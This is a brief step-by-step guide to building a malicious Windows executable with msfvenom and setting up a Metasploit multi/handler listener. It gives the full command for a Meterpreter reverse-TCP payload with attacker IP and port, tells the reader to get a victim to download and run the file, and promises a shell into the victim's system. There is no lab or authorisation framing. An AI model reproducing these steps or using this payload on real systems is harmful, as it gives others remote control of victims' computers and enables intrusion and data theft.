Step 1. Install Kali Linux.

Step 2. Create this malicious executable with msfvenom.

Step 3. See supported systems, type:
	msfvenom -l payloads
	
Step 4. Create a malicious executable with it, for example:

	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.14 LPORT=4444 -f exe -a x64 -o program.exe

	Change the parameters -p (system), LHOST (your vps ip), LPORT (vps port). Change the payload and output 
	format -f exe and -o program.exe as needed for your target system.

Step 5. This executable must be downloaded and run by the victim (the workstation).

Step 6. On the Kali vps server listen on your ip/port with the right payload. This should be your attacker ip and port

	msf> use exploit/multi/handler
	msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
	msf> set LHOST 192.168.1.14
	msf> set LPORT 4444
	msf> run

Step 7. Once the victim runs the program, you'll have a shell into his system.
